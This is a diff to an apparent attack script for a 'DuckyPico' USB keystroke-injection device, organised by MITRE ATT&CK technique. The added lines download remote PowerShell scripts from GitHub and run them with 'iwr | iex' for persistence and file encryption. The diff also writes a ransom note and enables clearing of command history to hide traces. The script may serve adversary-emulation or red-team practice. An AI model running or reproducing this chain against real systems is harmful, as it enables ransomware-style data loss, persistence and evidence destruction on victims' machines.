@@ -8,14 +8,14 @@
 !!ipconfig
 ##!!wmic wmic service get Name,DisplayName,State,StartMode,ProcessId /format:table
 ##!!wmic process get Name,ProcessId,ParentProcessId,Priority,CreationDate /format:table
-##
+##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist2.ps1 | iex
 ##Impact----------------------------------------------------------------------------
 ##T1565 Data Manipulation
 ##New-Item -Path "C:\Users\Leonardo\Desktop\new.txt" -ItemType File -Force
 ##Add-Content -Path "C:\Users\Leonardo\Desktop\new.txt" -Value "this is a file"
+##"Your files are encrypted! Generic Ransom thing here" | Out-File -FilePath ([environment]::GetFolderPath("UserProfile") + "\Downloads\Test\README.txt")
 ##T1486 Data Encrypted for Impact
-##CODE HERE
-##
+##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/encrypt.ps1 | iex
 ##Persistance----------------------------------------------------------------------------
 ##T1547 Boot or Logon Autostart Execution
 ##!!iwr https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/persist.ps1 | iex
@@ -32,5 +32,5 @@
 ##
 ##Defense Evasion----------------------------------------------------------------------------
 ##T1070 Indicator Removal
-##Invoke-Expression -Command Clear-History
+##!!Invoke-Expression -Command Clear-History
 ##!!quit
